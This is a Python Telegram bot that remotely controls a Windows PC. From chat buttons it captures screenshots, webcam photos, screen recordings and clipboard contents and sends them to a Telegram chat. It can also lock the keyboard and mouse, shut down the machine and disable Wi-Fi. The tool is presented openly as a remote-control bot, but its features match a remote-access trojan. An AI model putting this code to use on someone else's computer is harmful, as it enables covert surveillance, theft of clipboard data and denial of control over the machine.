import telebot 
from telebot import types 
import threading
import tempfile
from PIL import ImageGrab
import os 
import pyautogui as pg
import keyboard
import webbrowser
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL, CoInitialize
import cv2
import platform
import psutil
import time
import logging
import configparser
import pyperclip
import mss
import numpy as np
import subprocess
import pyttsx3

config = configparser.ConfigParser()
config.read('config.ini')

bot_token = config['bot']['token']
chat_id = config['bot']['chat_id']


bot = telebot.TeleBot(bot_token)

pg.FAILSAFE = False 
recording = False
recording_thread = False
out = None
mouse_blocked = False
keyboard_blocked = False

def startup_logging():

    logging.basicConfig(
        filename = 'ControlMasterBot.log',
        filemode = 'a',
        level = logging.DEBUG,
        format = '%(asctime)s - %(levelname)s - %(message)s',
        encoding = 'utf-8'
    )

def send_message_to_chat(chat_id, text):
    bot.send_message(chat_id, text)

def send_message_async(chat_id, message_text):
    threading.Thread(target=send_message_to_chat, args=(chat_id, message_text)).start()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        startup_logging()
        logging.info('Ծրագիրը բարչեհաջող սկսեց աշխատանքը')

        chat_id = message.chat.id
        print(f"Chat ID: {chat_id}")
        bot.send_message(chat_id, '👋 Welcome!')

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Keyboard")
        btn2 = types.KeyboardButton("Mouse")
        btn3 = types.KeyboardButton("System")
        btn4 = types.KeyboardButton("screenshot")
        markup.add(btn1, btn2, btn3, btn4)
        bot.send_message(message.chat.id, '👋', reply_markup=markup)

    except Exception as e:
        logging.error('Ստարտի ժամանակ ծրագիրում գտնվել է սխալ')

def handle_screenshot(message):
    try:
        logging.info('screenshot հրամանի կատարման սկիզբ')

        path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
        screenshot = ImageGrab.grab()
        screenshot.save(path, 'PNG')

        with open(path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        logging.info('սքրինշոթ հաջողությամբ ուղարկվեց')

    except Exception as e:
        logging.error(f'Սկրինշոթ անելու ժամանակ գտնվելա սխալ: {e}')
        bot.send_message(message.chat.id, "Սխալ տեղի ունեցավ սքրինշոթի ժամանակ")

def handle_shutdown(message):
    try:
        logging.info('system shutdown հրամանի կատարման սկիզբ')

        bot.send_message(message.chat.id, 'shutdown...')
        os.system("shutdown -s -t 1")
        bot.send_message(message.chat.id, "system is off")

    except Exception as e:
        logging.error('Սիստեմը աջատելիս գտնվելա սխալ')

def handle_reboot(message):
    try:
        logging.info('system reboot հրամանի մեկնարկ')

        bot.send_message(message.chat.id, "reboot system ...")
        os.system("shutdown -r -t 1")
        bot.send_message(message.chat.id, "the system has started rebooting")
    
    except Exception as e:
        logging.error('Սիստեմը վերագործարկման ժամանակ գտնվելա սխալ')

def clipboard(message):
    try:
        logging.info('Կլիփ բորդ հրամանի կատարման մակնարկ')

        x = pyperclip.paste()
        bot.send_message(message.chat.id, x)

        logging.info('հրամանը կատարված է')

    except Exception as e:
        logging.error('Կլիպ բորդ հրամանի կատարման սխալ')

def BreakSystem():
    try:
        logging.info('break system հրամանի մեկնարկ')

        os.system('taskkill /f /im python.exe')

    except Exception as e:
        logging.error('Բոտին անջատելու ընթացքում գտնվելա սխալ')

def OpenLink(message):
    try:
        logging.info('open link հրամանի կատարման մեկնարկ')

        bot.send_message(message.chat.id, "please send me the link")
        def save_link(msg):
            try:
                link = msg.text
                logging.info('ուղղարկված լինքը պահվեց փոփոխականում')

            except Exception as e:
                logging.error('ուղղարկված լինքի պահման սխալ')

            bot.send_message(msg.chat.id, f"Opening link: {link}")
            webbrowser.open_new(link)
        bot.register_next_step_handler(message, save_link)

    except Exception as e:
        logging.error('open link հրամանի կատարման ժամանակ տեղի է ունեցել սխալ')

def screen_record():
    global recording, out

    with mss.mss() as sct:
        monitor = sct.monitors[1]
        width = monitor["width"]
        height = monitor["height"]

        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter("video.mp4", fourcc, 10.0, (width, height))

        while recording:
            img = sct.grab(monitor)
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
            out.write(frame)

        out.release()
        out = None

def start_recording(message):
    global recording, recording_thread

    try:
        logging.info('Զապիսը սկսելու հրամանի կանչ')

        if not recording:
            recording = True

            recording_thread = threading.Thread(target=screen_record)
            recording_thread.start()

            logging.info('Զապիսը սկսված է')
            bot.reply_to(message, 'Recording has been started')
        
        else:
            logging.info('Զապիսը միացած էր')

            bot.reply_to(message, 'The recording is already connected.')

    except Exception as e:
        logging.error('Զապիսը միացնելու հետ խնդիր կա')

def stop_recording(message):
    global recording

    try:
        logging.info('Զապիսը անջատելու հրամանի կանչ')

        if recording:
            recording = False

            logging.info('Զապիսը ավարտվել է ֆայլը պահպանված է')
            bot.reply_to(message, 'Recording has been stopeed, file saved')

        else:
            logging.info('Զապիսը անջատված էր')
            bot.reply_to(message, 'The recording is already stopped')

    except Exception as e:
        logging.error('Զապիսը անջատելու հետ կապված խնդիր կա')

def keyboard_button(message):
    try:
        logging.info('any button հրամանի կատարման մեկնարկ')
        
        bot.send_message(message.chat.id, "please say me button name")
        def save_button_name(msg):
            try:
                button = msg.text
                logging.info('լինքը պահվեց փոփոխականում')
            
            except Exception as e:
                logging.error('լինքի պահման սխալ')
            
            pg.press(button)
            bot.send_message(message.chat.id, f"Button {button} pressed")
        bot.register_next_step_handler(message, save_button_name)

    except Exception as e:
        logging.error('any button հրամանի կատարման սխալ')

def Vc(message):
    try:
        logging.info('voice control հրամանի կատարման մեկնարկ')

        bot.send_message(message.chat.id, "please say the volume procentage")
        def save_value(msg):
            
            volume_procent = float(msg.text) / 100
            logging.info('Ձայնի բարձրության արժեքը պահպանվեց')

            CoInitialize()
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(volume_procent, None)
            bot.send_message(msg.chat.id, f"volume set to {msg.text}%")

            
        bot.register_next_step_handler(message, save_value)
    
    except Exception as e:
        logging.error('voice control հրամանի կատարման սխալ')

def send_camera_photo(message):
    try:
        logging.info('camera photo հրամանի կատարման մեկնարկ')

        bot.send_message(message.chat.id, 'your camera photo')
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            photo_path = 'camera.jpg'
            cv2.imwrite(photo_path, frame)
            cam.release()

            with open(photo_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)

            logging.info('Տեսախցիկի լուսանկարն ուղարկված է')

        else:
            logging.error('Պատկերի նկարահանման սխալ')
    
    except Exception as e:
        logging.error('camera photo հրամանի կատարման սխալ')
    
def block_mouse():
    try:
        logging.info('block mouse հրամանի մեկնարկ')

        x, y = pg.position()  # ներկա կուրսորի դիրքը

        while mouse_blocked:
            pg.moveTo(x, y)
            time.sleep(0.01)

    except Exception as e:
        logging.error(f'block mouse սխալ: {e}')


def system_info(message):
    try:
        logging.info('system info հրամանի կատարման մեկնարկ')

        try:
            system = platform.system()
            node = platform.node()
            release = platform.release()
            version = platform.version()
            architecture = platform.architecture()

            cpu_usage = psutil.cpu_percent(interval=1)
            cpu_cores = psutil.cpu_count(logical=False)

            mem = psutil.virtual_memory()
            ram_usage_percent = mem.percent
            total_ram_gb = mem.total / (1024 ** 3)
            available_ram_gb = mem.available / (1024 ** 3)

            disk = psutil.disk_usage('C:\\')
            total_disk_gb = disk.total / (1024 ** 3)
            used_disk_gb = disk.used / (1024 ** 3)
            free_disk_gb = disk.free / (1024 ** 3)
            disk_percent = disk.percent

            logging.info('Փոփոխականները բարեհաջող պահպանվեցին')

        except Exception as e:
            logging.error('Փոփոխականների պահպանման սխալ')

        bot.send_message(message.chat.id, "this is your system info")
        bot.send_message(message.chat.id, "👇")

        bot.send_message(message.chat.id,
            f"System: {system}\n"
            f"Node Name: {node}\n"
            f"OS Release: {release}\n"
            f"Version: {version}\n"
            f"Architecture: {architecture}"
        )

        bot.send_message(message.chat.id, 
            f"CPU Usage: {cpu_usage}%\n"
            f"Number of Cores: {cpu_cores}\n"
        )

        bot.send_message(message.chat.id, 
            f"RAM Usage: {ram_usage_percent}%\n"
            f"Total RAM: {total_ram_gb:.2f} GB\n"
            f"Available RAM: {available_ram_gb:.2f} GB\n"
        )

        bot.send_message(message.chat.id, 
            f"Disk Size: {total_disk_gb:.2f} GB\n"
            f"Used: {used_disk_gb:.2f} GB\n"
            f"Free: {free_disk_gb:.2f} GB\n"
            f"Usage Percentage: {disk_percent}%"
        )

    except Exception as e:
        logging.error('system info հրամանի կատարման սխալ')

def wifi_off(message):

    try:
        logging.info('wifi off հրամանի կատարման կանչ')

        subprocess.call('netsh interface set interface name=\"Wi-Fi\" admin=disabled', shell=True)
        bot.send_message(message.chat.id, 'wifi is off')
        logging.info('wifi_off հրամաը կատարված է')

    except Exception as e:
        logging.error('wifi off հրամանի կատարման սխալ')

def wifi_on(message):

    try:
        logging.info('wifi on հրամանի կատարման կանչ')

        subprocess.call('netsh interface set interface name=\"Wi-Fi\" admin=enabled', shell=True)
        bot.send_message(message.chat.id, "wifi is on")
        logging.info('wifi on հրամանը կատարված է')

    except Exception as e:
        logging.error('wifi on հրամանի կատարման սխալ')

def block_keyboard():
    try:
        logging.info('block_keyboard բլոկի կանչ')

        global keyboard_blocked  
        blocked_keys = [
            "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
            "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "\n",
            "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
            "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
            "*", "-", "=", "+", "|", "`",
            "\t", " ", "shift", "windows", "alt", "esc", "backspace", "ctrl"
        ]  
        if keyboard_blocked:
            for key in blocked_keys:
                keyboard.block_key(key)
        else:
            for key in blocked_keys:
                keyboard.unblock_key(key)
    
    except Exception as e:
        logging.error('def block_keyboard() բլոկի սխալ')

def handle_mouse_off(message):
    try:
        logging.info('mouse block հրամանի կատարման մեկնարկ')
        global mouse_blocked
        if not mouse_blocked:
            mouse_blocked = True
            threading.Thread(target=block_mouse, daemon=True).start()

    except Exception as e:
        logging.error('mouse block հրամանի կատարման սխալ')
    
def handle_mouse_on(message):
    try:
        logging.info('mouse on հրամանի կատարման մեկնարկ')
        
        global mouse_blocked
        mouse_blocked = False
        bot.send_message(message.chat.id, 'mouse has been unblocked')
        logging.info('մկնիկը բացվեց')

    except Exception as e:
        logging.error('mouse on հրամանի կատարման սխալ')

def handler_keyboard_off(message):
    try:
        logging.info('keyboard off հրամանի կատարման մեկնարկ')
        global keyboard_blocked
        keyboard_blocked = True
        bot.send_message(message.chat.id, 'keyboard has been blocked')
        block_keyboard()
        logging.info('ստեղնաշարը արգելափակվեց')

    except Exception as e:
        logging.error('keyboard off հրամանի կատարման սխալ')

def handler_keyboard_on(message):
    try:
        logging.info('keyboard on հրամանի կատարման մեկնարկ')

        global keyboard_blocked
        keyboard_blocked = False
        bot.send_message(message.chat.id, 'keyboard has been unblocked')
        block_keyboard()

        logging.info('Ստեղնաշարը բացվեց')

    except Exception as e:
        logging.error('keyboard on հրամանի կատարման սխալ')

def handler_OpenLink(message):
    try:
        logging.info('open link ի մեկնարկ')

        OpenLink()
        bot.send_message(message.chat.id, 'link has been opened')

        logging.info('Հղումը բացված է')
    
    except Exception as e:
        logging.error('open link հրամանը չկատարվեց  ')

def speak_text_russian(message):
    try:
        logging.info('speak text russian հրամանի կատարման կանչ')

        bot.send_message(message.chat.id, "Write the text that should be spoken in Russian")

        def save_speak_text_ru(msg):
            try:
                text = msg.text
                logging.info(f'ստացվեց տեքստը՝ {text}')

                engine = pyttsx3.init()
                ru_voice_id = '''
                    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Speech\\Voices\\Tokens\\TTS_MS_RU-RU_IRINA_11.0
                '''
                engine.setProperty('voice', ru_voice_id)
                engine.say(text)
                engine.runAndWait()

                bot.send_message(message.chat.id, 'The text was said in Russian. ✅')
                logging.info('տեքստը ռուսերենով ասվեց')

            except Exception as e:
                logging.error(f'Խնդիր տեքստը կարդալու ժամանակ: {e}')
                bot.send_message(message.chat.id, 'An error occurred while speaking the text. ⚠️')

        bot.register_next_step_handler(message, save_speak_text_ru)

    except Exception as e:
        logging.error(f'speak text russian հրամանի սխալ: {e}')
        bot.send_message(message.chat.id, 'Սխալ տեղի ունեցավ հրամանը ընդունելիս ⚠️')

def speak_text_english(message):
    try:
        logging.info('speak text english հրամանի կանչ')

        bot.send_message(message.chat.id, 'Send the text you want the PC to say in English')

        def save_speak_text_en(msg):
            try:
                text = msg.text
                logging.info(f'ՏԵկստը ստացա։ {text}')

                engine = pyttsx3.init()
                voices = engine.getProperty('voices')
                for voice in voices:
                    if "en" in voice.id.lower():
                        engine.setProperty('voice', voice.id)
                        break

                engine.setProperty('rate', 150)
                engine.say(text)
                engine.runAndWait()

                bot.send_message(message.chat.id, 'Twxt was a spoken in English')
                logging.info('տեքստը ասել եմ անգլերենով')

            except Exception as e:
                logging.error('անգլերեն ասելու սխալ')
                bot.send_message(message.chat.id, 'Something went wrong while speaking English text')

        bot.register_next_step_handler(message, save_speak_text_en)

    except Exception as e:

        logging.error('անգլերեն ասելու ընթացքում սխալ կա')
        bot.send_message(message.chat.id, 'Failed to execute the English speak command ⚠️')

@bot.message_handler(content_types=['text'])
def func(message):
    if message.text == "Keyboard":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("⌨ off")
        btn2 = types.KeyboardButton("⌨ on")
        btn3 = types.KeyboardButton("(Ctrl + W) close active window")
        btn4 = types.KeyboardButton("( space )")
        btn5 = types.KeyboardButton("(Win + D) to desktop")
        btn6 = types.KeyboardButton("home page")
        btn7 = types.KeyboardButton("screenshot")
        btn8 = types.KeyboardButton("any button")
        markup.add(btn1, btn2, btn3, btn3, btn4, btn5, btn6, btn7, btn8)
        bot.send_message(message.chat.id, 'keyboard control', reply_markup=markup)

    elif message.text == '(Ctrl + W) close active window':
        try:
            logging.info('(ctrl + w ) հոտկեյի սեղմման մեկնարկ')

            pg.hotkey('ctrl', 'w')
            bot.send_message(message.chat.id, '(Ctrl + W) hotkey has been pressed')
            logging.info('հոտկեյը սեղմվեց')

        except Exception as e:
            logging.error('հոտկեյի սեղմման սխալ')

    elif message.text == '( space )':
        try:
            logging.info('space ի սեղմման հրամանի մեկնարկ')

            pg.press('space')
            bot.send_message(message.chat.id, 'button (space) has been pressed')
            logging.info('space ը սեղմված է')

        except Exception as e:
            logging.error('space ի սեղմման հրամանի կատարման սխալ')

    elif message.text == '(Win + D) to desktop':
        try:
            logging.info('win + d հոտկեյի սեղմման մեկնարկ')

            pg.hotkey('win', 'd')
            bot.send_message(message.chat.id, '(Win + D) hotkey has been pressed')
            logging.info('win + d ն սեղմվեց')

        except Exception as e:
            logging.error('win + d հոտկեյի կատարման սխալ')

    elif message.text == 'any button':
        try:
            logging.info('any button հրամանի մեկնարկ')
            
            keyboard_button(message)
            logging.info('any button հրամանը կատարված է')

        except Exception as e:
            logging.error('any button հրամանի կատարման սխալ')

    elif message.text == "Mouse":
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton('🖱 off')
        btn2 = types.KeyboardButton('🖱 on')
        btn3 = types.KeyboardButton('left click')
        btn4 = types.KeyboardButton('right click')
        btn5 = types.KeyboardButton('home page')
        btn6 = types.KeyboardButton('screenshot')
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
        bot.send_message(message.chat.id, 'mouse control', reply_markup=markup)

    elif message.text == 'left click':
        try:
            logging.info('left click հրամանի կատարման մեկնարկ')

            pg.click(button='left')
            logging.info('left click հրամանը կատարված է')
            bot.send_message(message.chat.id, 'left click has been clicked')

        except Exception as e:
            logging.error('left click հրամանի կատարման սխալ')

    elif message.text == 'right click':
        try:
            logging.info('right click հրամանի կատարման մեկնարկ')

            pg.click(button='right')
            logging.info('right click հրամանը կատարված է')
            bot.send_message(message.chat.id, 'right click has been clicked')

        except Exception as e:
            logging.error('right click հրամանի կատարման սխալ')

    
    elif message.text == 'System':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton('screenshot')
        btn2 = types.KeyboardButton('system off')
        btn3 = types.KeyboardButton('system reboot')
        btn4 = types.KeyboardButton('home page')
        btn5 = types.KeyboardButton('open link')
        btn6 = types.KeyboardButton('volume control')
        btn7 = types.KeyboardButton('system information')
        btn8 = types.KeyboardButton('camera photo')
        btn9 = types.KeyboardButton('clipboard')
        btn10 = types.KeyboardButton('start recording')
        btn11 = types.KeyboardButton('stop recording')
        btn12 = types.KeyboardButton('wifi on')
        btn13 = types.KeyboardButton('wifi off')
        btn14 = types.KeyboardButton('speak text english')
        btn15 = types.KeyboardButton('speak text russian')
        markup.add(    
            btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10,
            btn11, btn12, btn13, btn14, btn15
         )
        bot.send_message(message.chat.id, 'system control', reply_markup=markup)

    elif message.text == 'home page':
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton('Keyboard')
        btn2 = types.KeyboardButton('Mouse')
        btn3 = types.KeyboardButton("System")
        btn4 = types.KeyboardButton('screenshot')
        markup.add(btn1, btn2, btn3, btn4)
        bot.send_message(message.chat.id, 'home page', reply_markup=markup)

    elif message.text == 'speak text english':
        speak_text_english(message)

    elif message.text == 'speak text russian':
        speak_text_russian(message)

    elif message.text == 'wifi on':
        wifi_on(message)

    elif message.text == 'wifi off':
        wifi_off(message)

    elif message.text == 'start recording':
        start_recording(message)

    elif message.text == 'stop recording':
        stop_recording(message)
        logging.info('Զապիսը անջատեցի ուղղարկում եմ ֆայլը')

        with open('video.mp4', 'rb') as video:
            bot.send_video(chat_id, video)
            
    elif message.text == 'camera photo':
        send_camera_photo(message)

    elif message.text == 'system information':
        system_info(message)

    elif message.text == 'clipboard':
        clipboard(message)
    
    elif message.text == 'open link':
        OpenLink(message)

    elif message.text == 'volume control':
        Vc(message)

    elif message.text == 'screenshot':
        handle_screenshot(message)

    elif message.text == 'system off':
        handle_shutdown(message)

    elif message.text == 'system reboot':
        handle_reboot(message)

    elif message.text == '🖱 off':
        handle_mouse_off(message)

    elif message.text == '🖱 on':
        handle_mouse_on(message)

    elif message.text == '⌨ off':
        handler_keyboard_off(message)

    elif message.text == '⌨ on':
        handler_keyboard_on(message)

    elif message.text == 'break':
        try:
            logging.info('break bot հրամանի կատարման մեկնարկ')
            
            bot.send_message(message.chat.id, 'bot has been breaked')
            logging.info('block bot հրամանը կատարված է լոգ ֆայլը ուղղարկված է չատ այդի ով')

            with open("ControlMasterBot.log", "rb") as log_file:
                bot.send_document(message.chat.id, log_file)

            BreakSystem()

        except Exception as e:
            logging.error('block bot ի կատարման սխալ')

bot.polling(non_stop=True)